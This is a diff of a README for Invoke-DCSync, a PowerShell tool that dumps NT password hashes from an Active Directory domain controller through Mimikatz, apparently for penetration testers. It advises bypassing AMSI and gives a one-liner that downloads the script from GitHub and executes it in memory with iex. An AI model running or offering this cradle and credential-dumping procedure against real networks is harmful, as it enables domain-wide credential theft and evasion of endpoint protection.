@@ -1,12 +1,6 @@
 # Invoke-DCSync
 PowerShell script to DCSync NT-Hashes from an Active Directory Domain Controller (DC) via Mimikatz. 
 
-Output format is split into 4 files:
-- raw mimikatz log
-- hashes only
-- users only 
-- tuple list of user and hash for cracking
-
 ## General Preparation
 
 1. Connect to the internal AD network via VPN or directly, if on-site.
@@ -30,14 +24,7 @@ It is recommended to bypass AMSI for the current PowerShell session. Use a 0-Day
 
 # DCSync Execution
 
-Download ``Invoke-DCSync.ps1`` into memory, which executes the DCSync process.
-
-As a result, we will obtain four files located under C:\temp\ directory:
-
-1. **DCSync_NTLM_full**: Just the complete logfile of running Mimikatz
-2. **DCSync_NTLM_Hashes**: Only contains the NT-Hashes
-3. **DCSync_NTLM_Users**: Only contains the employee's username
-4. **DCSync_NTLM_UserHash_Import**: Contains the tuple of username and hash
+Download ``Invoke-DCSync.ps1`` into memory, which executes the DCSync process. You will be prompted to start the DCSync process and the output directory with all relevant files will be automatically opened by Window's file explorer.
 
 ````
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/Invoke-DCSync.ps1')
